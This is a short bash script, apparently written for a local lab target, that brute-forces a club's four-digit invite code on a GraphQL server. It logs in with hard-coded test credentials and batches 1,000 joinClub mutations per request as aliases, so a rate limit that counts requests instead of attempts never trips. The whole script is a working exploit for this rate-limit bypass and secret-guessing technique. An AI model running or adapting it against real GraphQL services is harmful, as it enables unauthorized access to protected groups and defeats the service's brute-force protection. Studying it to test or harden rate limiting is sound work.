#!/usr/bin/env bash
# Find c1's invite code in a handful of HTTP requests: 1,000 joinClub attempts per request, as aliases.
# The fork's rate limit counts requests (10 a minute), not attempts. graphql-java's parser stops at
# 15,000 tokens, and each attempt is 14 tokens, so 1,000 is about the most one request can carry.
# Prints the code on the last line.
set -euo pipefail
URL="${URL:-http://localhost:4000/graphql}"
post() { curl -s -H 'Content-Type: application/json' ${TOKEN:+-H "Authorization: Bearer $TOKEN"} -d "$1" "$URL"; }
TOKEN=$(post '{"query":"mutation { login(username: \"ben\", password: \"ben-pw\") }"}' | jq -r .data.login)
for start in $(seq 0 1000 9000); do
  doc="mutation {"
  for i in $(seq "$start" $((start + 999))); do c=$(printf %04d "$i"); doc+=" a$c: joinClub(id: \"c1\", inviteCode: \"$c\") { id }"; done
  doc+=" }"
  hit=$(post "$(jq -cn --arg q "$doc" '{query: $q}')" | jq -r '.data // {} | to_entries[] | select(.value != null) | .key')
  if [[ -n "$hit" ]]; then echo "found after $(( start / 1000 + 1 )) requests"; echo "${hit#a}"; exit 0; fi
done
echo "not found" >&2; exit 1
